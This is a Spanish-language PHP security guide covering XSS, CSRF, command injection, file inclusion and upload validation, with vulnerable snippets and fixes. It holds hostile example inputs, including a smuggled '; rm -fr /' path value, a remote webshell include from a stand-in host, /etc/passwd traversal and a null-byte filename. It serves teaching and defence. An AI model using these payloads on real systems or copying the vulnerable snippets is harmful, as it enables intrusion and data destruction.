Como la mayoría de los sitios web funcionan con PHP, la seguridad de las aplicaciones es un tema importante para que los desarrolladores de PHP protejan su sitio web, sus datos y sus clientes. Este tema cubre las mejores prácticas de seguridad en PHP, así como las vulnerabilidades y debilidades comunes con correcciones de ejemplo en PHP.

Fuga de versión de PHP #

De forma predeterminada, PHP le dirá al mundo qué versión de PHP está utilizando, p.

X-Powered-By: PHP/5.3.8

Para solucionar esto, puede cambiar php.ini:

expose_php = off

O cambia el encabezado:

header("X-Powered-By: Magic");

O si prefiere un método htaccess:

Header unset X-Powered-By

Si alguno de los métodos anteriores no funciona, también existe la función header_remove() que le brinda la posibilidad de eliminar el encabezado:

header_remove('X-Powered-By');

Si los atacantes saben que está utilizando PHP y la versión de PHP que está utilizando, es más fácil para ellos explotar su servidor.

Secuencias de comandos entre sitios (XSS) #

Problema #

Las secuencias de comandos entre sitios son la ejecución no intencionada de código remoto por parte de un cliente web. Cualquier aplicación web puede exponerse a XSS si recibe información de un usuario y la envía directamente a una página web. Si la entrada incluye HTML o JavaScript, el código remoto se puede ejecutar cuando el cliente web representa este contenido.

Por ejemplo, si un lado de un tercero contiene un archivo JavaScript:

// http://example.com/runme.js
document.write("I'm running");

Y una aplicación PHP genera directamente una cadena que se le pasa:

<?php
echo '<div>' . $_GET['input'] . '</div>';

Si un parámetro GET sin marcar contiene <script src="http://example.com/runme.js"></script>, la salida del script PHP será:

<div><script src="http://example.com/runme.js"></script></div>

Se ejecutará el JavaScript de terceros y el usuario verá “Estoy ejecutando” en la página web.

Solución #

Como regla general, nunca confíe en la información proveniente de un cliente. Cada valor GET, POST y cookie puede ser cualquier cosa y, por lo tanto, debe validarse. Al generar cualquiera de estos valores, escápelos para que no se evalúen de forma inesperada.

Tenga en cuenta que incluso en las aplicaciones más simples, los datos se pueden mover y será difícil realizar un seguimiento de todas las fuentes. Por lo tanto, es una mejor práctica siempre escapar de la salida.

PHP proporciona algunas formas de escapar de la salida según el contexto.

Funciones de filtro #

Funciones de filtro de PHP permiten que los datos de entrada al script php sean desinfectados o validados de muchas formas. Son útiles cuando se guardan o generan entradas del cliente.

Codificación HTML #

htmlspecialchars convertirá cualquier “caracter especial HTML” en sus codificaciones HTML, lo que significa que no serán procesados ​​como HTML estándar. Para arreglar nuestro ejemplo anterior usando este método:

<?php
echo '<div>' . htmlspecialchars($_GET['input']) . '</div>';
// or
echo '<div>' . filter_input(INPUT_GET, 'input', FILTER_SANITIZE_SPECIAL_CHARS) . '</div>';

Daría salida:

<div>&lt;script src=&quot;http://example.com/runme.js&quot;&gt;&lt;/script&gt;</div>

Todo lo que esté dentro de la etiqueta <div> no será interpretado como una etiqueta de JavaScript por el navegador, sino como un nodo de texto simple. El usuario verá con seguridad:

<script src="http://example.com/runme.js"></script>

Codificación de URL #

Al generar una URL generada dinámicamente, PHP proporciona la función urlencode para generar direcciones URL válidas de forma segura. Entonces, por ejemplo, si un usuario puede ingresar datos que se vuelven parte de otro parámetro GET:

<?php
$input = urlencode($_GET['input']);
// or
$input = filter_input(INPUT_GET, 'input', FILTER_SANITIZE_URL);
echo '<a href="http://example.com/page?input="' . $input . '">Link</a>';

Cualquier entrada maliciosa se convertirá en un parámetro de URL codificado.

Uso de bibliotecas externas especializadas o listas OWASP AntiSamy #

A veces querrá enviar HTML u otro tipo de entradas de código. Deberá mantener una lista de palabras autorizadas (lista blanca) y no autorizadas (lista negra).

Puede descargar listas estándar disponibles en el sitio web de OWASP AntiSamy. Cada lista es apta para un tipo específico de interacción (ebay api, tinyMCE, etc…). Y es de código abierto.

Existen bibliotecas para filtrar HTML y prevenir ataques XSS para el caso general y funcionan al menos tan bien como las listas de AntiSamy con un uso muy fácil. Por ejemplo, tiene Purificador de HTML

Falsificación de solicitud entre sitios #

Problema #

La falsificación de solicitudes entre sitios o CSRF puede obligar a un usuario final a generar, sin saberlo, solicitudes maliciosas a un servidor web. Este vector de ataque puede explotarse tanto en solicitudes POST como GET. Digamos, por ejemplo, que el punto final de URL /delete.php?accnt=12 elimina la cuenta tal como se pasa desde el parámetro accnt de una solicitud GET. Ahora, si un usuario autenticado encontrará el siguiente script en cualquier otra aplicación

<img src="http://domain.com/delete.php?accnt=12" width="0" height="0" border="0">

la cuenta sería eliminada.

Solución #

Una solución común a este problema es el uso de tokens CSRF. Los tokens CSRF están integrados en las solicitudes para que una aplicación web pueda confiar en que una solicitud provino de una fuente esperada como parte del flujo de trabajo normal de la aplicación. Primero, el usuario realiza alguna acción, como ver un formulario, que activa la creación de un token único. Un formulario de muestra que implementa esto podría verse como

<form method="get" action="/delete.php">
  <input type="text" name="accnt" placeholder="accnt number" />
  <input type="hidden" name="csrf_token" value="<randomToken>" />
  <input type="submit" />
</form>

Luego, el servidor puede validar el token con la sesión del usuario después del envío del formulario para eliminar las solicitudes maliciosas.

Código de muestra #

Aquí hay un código de muestra para una implementación básica:

/* Code to generate a CSRF token and store the same */
...
<?php
  session_start();
  function generate_token() {
    // Check if a token is present for the current session
    if(!isset($_SESSION["csrf_token"])) {
        // No token present, generate a new one
        $token = random_bytes(64);
        $_SESSION["csrf_token"] = $token;
    } else {
        // Reuse the token
        $token = $_SESSION["csrf_token"];
    }
    return $token;
  }
?>
<body>
  <form method="get" action="/delete.php">
    <input type="text" name="accnt" placeholder="accnt number" />
    <input type="hidden" name="csrf_token" value="<?php echo generate_token();?>" />
    <input type="submit" />
  </form>
</body>
...


/* Code to validate token and drop malicious requests */
...
<?php
  session_start();
  if ($_GET["csrf_token"] != $_SESSION["csrf_token"]) {
    // Reset token
    unset($_SESSION["csrf_token"]);
    die("CSRF token validation failed");
  }
?>
...

Ya hay muchas bibliotecas y marcos disponibles que tienen su propia implementación de validación CSRF. Aunque esta es la implementación simple de CSRF, debe escribir un código para regenerar su token CSRF dinámicamente para evitar el robo y la fijación del token CSRF.

Inyección de línea de comandos #

Problema #

De manera similar a como la inyección de SQL permite a un atacante ejecutar consultas arbitrarias en una base de datos, la inyección de línea de comandos permite que alguien ejecute comandos del sistema que no son de confianza en un servidor web. Con un servidor protegido incorrectamente, esto le daría a un atacante un control completo sobre un sistema.

Digamos, por ejemplo, que un script permite a un usuario enumerar el contenido de un directorio en un servidor web.

<pre>
<?php system('ls ' . $_GET['path']); ?>
</pre>

(En una aplicación del mundo real, uno usaría las funciones u objetos incorporados de PHP para obtener el contenido de la ruta. Este ejemplo es para una demostración de seguridad simple).

Uno esperaría obtener un parámetro ruta similar a /tmp. Pero como se permite cualquier entrada, ruta podría ser ; rm-fr/. El servidor web entonces ejecutaría el comando

ls; rm -fr /

e intente eliminar todos los archivos de la raíz del servidor.

Solución #

Todos los argumentos de comando deben escaparse usando escapeshellarg() o escapeshellcmd(). Esto hace que los argumentos no sean ejecutables. Para cada parámetro, el valor de entrada también debe ser validado.

En el caso más simple, podemos asegurar nuestro ejemplo con

<pre>
<?php system('ls ' . escapeshellarg($_GET['path'])); ?>
</pre>

Siguiendo el ejemplo anterior con el intento de eliminar archivos, el comando ejecutado se convierte en

ls '; rm -fr /'

Y la cadena simplemente se pasa como un parámetro a ls, en lugar de terminar el comando ls y ejecutar rm.

Cabe señalar que el ejemplo anterior ahora es seguro desde la inyección de comandos, pero no desde el recorrido del directorio. Para solucionar esto, se debe verificar que la ruta normalizada comience con el subdirectorio deseado.

PHP ofrece una variedad de funciones para ejecutar comandos del sistema, incluidos exec, passthru, proc_open, shell_exec y system. Todos deben tener sus entradas cuidadosamente validadas y escapadas.

Error al reportar #

De forma predeterminada, PHP generará mensajes de errores, advertencias y avisos directamente en la página si ocurre algo inesperado en un script. Esto es útil para resolver problemas específicos con una secuencia de comandos, pero al mismo tiempo genera información que no desea que los usuarios conozcan.

Por lo tanto, es una buena práctica evitar mostrar esos mensajes que revelarán información sobre su servidor, como su árbol de directorios, por ejemplo, en entornos de producción. En un entorno de desarrollo o prueba, estos mensajes aún pueden ser útiles para mostrar con fines de depuración.

Una solución rápida #

Puede desactivarlos para que los mensajes no se muestren en absoluto, sin embargo, esto dificulta la depuración de su secuencia de comandos.

<?php
  ini_set("display_errors", "0");
?>

O cámbielos directamente en php.ini.

display_errors = 0

Manejo de errores #

Una mejor opción sería almacenar esos mensajes de error en un lugar donde sean más útiles, como una base de datos:

set_error_handler(function($errno , $errstr, $errfile, $errline){
  try{
    $pdo = new PDO("mysql:host=hostname;dbname=databasename", 'dbuser', 'dbpwd', [
      PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);

    if($stmt = $pdo->prepare("INSERT INTO `errors` (no,msg,file,line) VALUES (?,?,?,?)")){
      if(!$stmt->execute([$errno, $errstr, $errfile, $errline])){
        throw new Exception('Unable to execute query');
      }
    } else {
      throw new Exception('Unable to prepare query');
    }
  } catch (Exception $e){
    error_log('Exception: ' . $e->getMessage() . PHP_EOL . "$errfile:$errline:$errno | $errstr");
  }
});

Este método registrará los mensajes en la base de datos y, si eso falla, en un archivo en lugar de repetirlo directamente en la página. De esta manera, puede realizar un seguimiento de lo que los usuarios están experimentando en su sitio web y notificarle de inmediato si algo sale mal.

Inclusión de archivos #

Inclusión de archivos remotos #

La inclusión de archivos remotos (también conocida como RFI) es un tipo de vulnerabilidad que permite a un atacante incluir un archivo remoto.

Este ejemplo inyecta un archivo alojado de forma remota que contiene un código malicioso:

<?php
include $_GET['page'];

/vulnerable.php?page=http://evil.example.com/webshell.txt?

Inclusión de archivos locales #

La inclusión de archivos locales (también conocida como LFI) es el proceso de incluir archivos en un servidor a través del navegador web.

<?php
$page = 'pages/'.$_GET['page'];
if(isset($page)) {
    include $page;
} else {
    include 'index.php';
}

/vulnerable.php?page=../../../../etc/passwd

Solución a RFI y LFI: #

Se recomienda permitir solo la inclusión de archivos que haya aprobado y limitarse solo a esos.

<?php
$page = 'pages/'.$_GET['page'].'.php';
$allowed = ['pages/home.php','pages/error.php'];
if(in_array($page,$allowed)) {
    include($page);
} else {
    include('index.php');
}

Etiquetas para pelar #

strip_tags es una función muy poderosa si sabe cómo usarla. Como método para prevenir ataques de secuencias de comandos entre sitios, existen mejores métodos, como la codificación de caracteres, pero la eliminación de etiquetas es útil en algunos casos.

Ejemplo básico #

$string = '<b>Hello,<> please remove the <> tags.</b>';

echo strip_tags($string);

Salida sin procesar

Hello, please remove the tags.

Permitir etiquetas #

Digamos que desea permitir una determinada etiqueta, pero no otras etiquetas, entonces lo especificaría en el segundo parámetro de la función. Este parámetro es opcional. En mi caso, solo quiero que se pase la etiqueta <b>.

$string = '<b>Hello,<> please remove the <br> tags.</b>';

echo strip_tags($string, '<b>');

Salida sin procesar

<b>Hello, please remove the  tags.</b>

Aviso(s) #

Los comentarios HTML y las etiquetas PHP también se eliminan. Esto está codificado y no se puede cambiar con allowable_tags.

En PHP 5.3.4 y versiones posteriores, las etiquetas XHTML de cierre automático se ignoran y solo las etiquetas que no se cierran automáticamente deben usarse en etiquetas permitidas. Por ejemplo, para permitir tanto <br> como <br/>, debe usar:

<?php
strip_tags($input, '<br>');
?>

1: https://www.wikiod.com/es/php/seguridad#Secuencias de comandos entre sitios (XSS)

Subiendo archivos #

Si desea que los usuarios carguen archivos en su servidor, debe realizar un par de controles de seguridad antes de mover el archivo cargado a su directorio web.

Los datos subidos: #

Esta matriz contiene usuario datos enviados y no información sobre el archivo en sí. Si bien, por lo general, estos datos son generados por el navegador, se puede realizar fácilmente una solicitud posterior al mismo formulario utilizando el software.

$_FILES['file']['name'];
$_FILES['file']['type'];
$_FILES['file']['size'];
$_FILES['file']['tmp_name'];
  • nombre - Verifica cada aspecto del mismo.
  • tipo - Nunca use estos datos. En su lugar, se puede obtener utilizando funciones de PHP.
  • tamaño - Seguro de usar.
  • tmp_name - Seguro de usar.

Explotando el nombre del archivo #

Normalmente, el sistema operativo no permite caracteres específicos en un nombre de archivo, pero al falsificar la solicitud puede agregarlos para permitir que sucedan cosas inesperadas. Por ejemplo, nombremos el archivo:

../script.php%00.png

Observe bien ese nombre de archivo y notará un par de cosas.

  1. El primero en notar es el ../, totalmente ilegal en un nombre de archivo y al mismo tiempo perfectamente bien si está moviendo un archivo de 1 directorio a otro, lo que vamos a hacer, ¿verdad?
  2. Ahora podría pensar que estaba verificando las extensiones de archivo correctamente en su secuencia de comandos, pero este exploit se basa en la decodificación de URL, traduciendo % 00 a un carácter nulo, básicamente diciendo al sistema operativo, esta cadena termina aquí, eliminando off .png fuera del nombre de archivo.

Así que ahora subí script.php a otro directorio, pasando por alto las validaciones simples a las extensiones de archivo. También pasa por alto los archivos .htaccess y no permite que se ejecuten scripts desde su directorio de carga.

Obtener el nombre y la extensión del archivo de forma segura #

Puede usar pathinfo() para extrapolar el nombre y la extensión de manera segura, pero primero debemos reemplazar los caracteres no deseados en el archivo. nombre:

// This array contains a list of characters not allowed in a filename
$illegal   = array_merge(array_map('chr', range(0,31)), ["<", ">", ":", '"', "/", "\\", "|", "?", "*", " "]);
$filename  = str_replace($illegal, "-", $_FILES['file']['name']);

$pathinfo  = pathinfo($filename);
$extension = $pathinfo['extension'] ? $pathinfo['extension']:'';
$filename  = $pathinfo['filename']  ? $pathinfo['filename']:'';

if(!empty($extension) && !empty($filename)){
  echo $filename, $extension;
} else {
  die('file is missing an extension or name');
}

Si bien ahora tenemos un nombre de archivo y una extensión que se pueden usar para almacenar, sigo prefiriendo almacenar esa información en una base de datos y darle a ese archivo un nombre generado, por ejemplo, md5(uniqid().microtime())

+----+--------+-----------+------------+------+----------------------------------+---------------------+
| id | title  | extension | mime       | size | filename                         | time                |
+----+--------+-----------+------------+------+----------------------------------+---------------------+
| 1  | myfile | txt       | text/plain | 1020 | 5bcdaeddbfbd2810fa1b6f3118804d66 | 2017-03-11 00:38:54 |
+----+--------+-----------+------------+------+----------------------------------+---------------------+

Esto resolvería el problema de los nombres de archivo duplicados y las vulnerabilidades imprevistas en el nombre del archivo. También haría que el atacante adivine dónde se ha almacenado ese archivo, ya que no puede apuntarlo específicamente para su ejecución.

Validación de tipo Mime #

Verificar la extensión de un archivo para determinar qué archivo es no es suficiente, ya que un archivo puede llamarse image.png pero muy bien puede contener un script php. Al verificar el tipo MIME del archivo cargado con una extensión de archivo, puede verificar si el archivo contiene a lo que se refiere su nombre.

Incluso puede ir un paso más allá para validar imágenes, y eso es realmente abrirlas:

if($mime == 'image/jpeg' && $extension == 'jpeg' || $extension == 'jpg'){
  if($img = imagecreatefromjpeg($filename)){
    imagedestroy($img);
  } else {
    die('image failed to open, could be corrupt or the file contains something else.');
  }
}

Puede obtener el tipo mime usando una [función] incorporada (http://php.net/manual/en/function.mime-content-type.php) o una [clase] (http://php. net/manual/en/book.fileinfo.php).

Lista blanca de tus cargas #

Lo más importante es que debe incluir en la lista blanca las extensiones de archivo y los tipos mime según cada formulario.

function isFiletypeAllowed($extension, $mime, array $allowed)
{
    return  isset($allowed[$mime]) &&
            is_array($allowed[$mime]) &&
            in_array($extension, $allowed[$mime]);
}

$allowedFiletypes = [
    'image/png'  => [ 'png' ],
    'image/gif'  => [ 'gif' ],
    'image/jpeg' => [ 'jpg', 'jpeg' ],
];

var_dump(isFiletypeAllowed('jpg', 'image/jpeg', $allowedFiletypes));
